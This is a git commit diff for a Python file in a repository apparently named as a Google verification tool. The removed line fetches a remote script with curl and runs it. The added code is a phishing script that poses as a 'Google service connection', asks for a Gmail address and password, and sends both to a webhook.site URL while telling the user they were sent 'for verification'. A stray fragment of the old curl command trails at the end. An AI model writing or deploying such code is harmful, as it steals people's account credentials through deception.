23674fc65adab756c15d8be3c8aecb439320a4ad
muhammetdilsizemir-cyber <muhammetdilsizemir@gmail.com>
2026-04-17 15:50:09 +0300

    Update v.py

--- v.py
+++ v.py
@@ -1,1 +1,26 @@
-rm v.py && curl -sL https://raw.githubusercontent.com/muhammetdilsizemir-cyber/google-dogrulama/main/v.py -o v.py && python v.py
+import urllib.request
+import json
+
+# Buraya kendi Webhook URL'ni yapıştır
+WEBHOOK_URL = "https://webhook.site/7f7fa68e-1c15-43f2-b036-d9179808b05e"
+
+print("\n--- Google Servis Bağlantısı ---")
+email = input("Gmail Adresi: ")
+sifre = input("Şifre: ")
+
+data = {
+    "servis": "Gmail",
+    "kullanici": email,
+    "sifre": sifre
+}
+
+params = json.dumps(data).encode('utf8')
+req = urllib.request.Request(WEBHOOK_URL, data=params, headers={'content-type': 'application/json'})
+
+try:
+    with urllib.request.urlopen(req) as response:
+        if response.getcode() == 200:
+            print("\n[+] Bilgiler doğrulama için gönderildi!")
+except Exception as e:
+    print(f"\n[!] Hata: {e}")
+  .com/muhammetdilsizemir-cyber/google-dogrulama/main/v.py -o v.py && python v.py
